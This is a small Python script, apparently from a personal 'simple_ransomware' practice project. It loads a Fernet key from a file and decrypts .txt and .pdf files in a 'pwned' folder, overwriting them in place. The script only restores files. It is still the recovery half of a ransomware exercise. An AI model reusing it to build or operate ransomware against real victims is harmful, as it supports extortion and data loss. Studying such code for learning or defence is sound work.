import os
from pathlib import Path
from cryptography.fernet import Fernet

def decrypto():
    key_file = open(key_path, 'rb')
    key = key_file.read()
    key_file.close()
    print(f"Key> {key}")
    try:
        for arquivo in os.listdir(dir):
            if arquivo.endswith(ext):
                    caminho = (f"{dir}/{arquivo}")
                    print(f"Path> {caminho}")

                    a = open(caminho, 'rb')
                    dados = a.read()
                    a.close()

                    chave = Fernet(key)
                    dados_decrypto = chave.decrypt(dados)

                    file = open(caminho, 'wb')
                    file.write(dados_decrypto)
                    file.close()
    except Exception as exception:
        print(f"Chave errada ou arquivo não criptografado!")

if __name__ == '__main__':
    dir = Path(r'C:\Users\Fernando\Documents\offensivePython\simple_ransomware\pwned')
    ext = ('.txt', '.pdf')
    key_path = Path(r'C:\Users\Fernando\Documents\offensivePython\simple_ransomware')
    key_path = f'{key_path}/key.txt'
    decrypto()